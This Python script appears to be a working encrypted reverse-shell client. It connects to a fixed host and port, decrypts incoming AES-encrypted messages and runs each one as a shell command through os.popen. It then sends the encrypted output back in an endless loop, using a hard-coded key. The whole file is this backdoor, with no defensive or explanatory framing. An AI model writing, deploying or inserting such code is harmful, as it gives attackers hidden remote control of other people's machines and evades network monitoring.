#!/usr/bin/env python
# -*- coding: utf-8 -*-

import base64
import os
import socket

from Crypto import Random
from Crypto.Cipher import AES

HOST = 'localhost'
PORT = 1337
BS   = 16
KEY  = '82e672ae054aa4de6f042c888111686a'


def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


def encrypt(plaintext):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)


def decrypt(ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')


def main():
    s = socket.socket()
    s.connect((HOST, PORT))
    
    while True:
        data = s.recv(1024)
        results = os.popen(decrypt(data)).read()
        s.sendall(encrypt(results))


if __name__ == '__main__':
    main()
